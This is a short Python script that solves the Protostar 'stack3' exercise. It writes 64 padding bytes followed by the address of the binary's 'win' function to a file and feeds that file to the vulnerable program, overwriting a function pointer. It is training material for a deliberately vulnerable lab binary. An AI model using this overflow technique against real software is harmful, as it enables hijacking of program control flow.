#!/usr/bin/python
# GDB reports win located at 0x804842a

import commands
import re

# Create new file write buffer to file
file = open('buffer', 'w+')
buffer = 'A'*64 + '\x2a\x84\x04\x08'
file.write(buffer)
file.close()

# Path to binary
command = '/opt/protostar/bin/stack3'

# String to execiute command and send buffer file as input
line = command + " < buffer"

# Execute the command with the current buffer
output = commands.getoutput(line)
print(output)
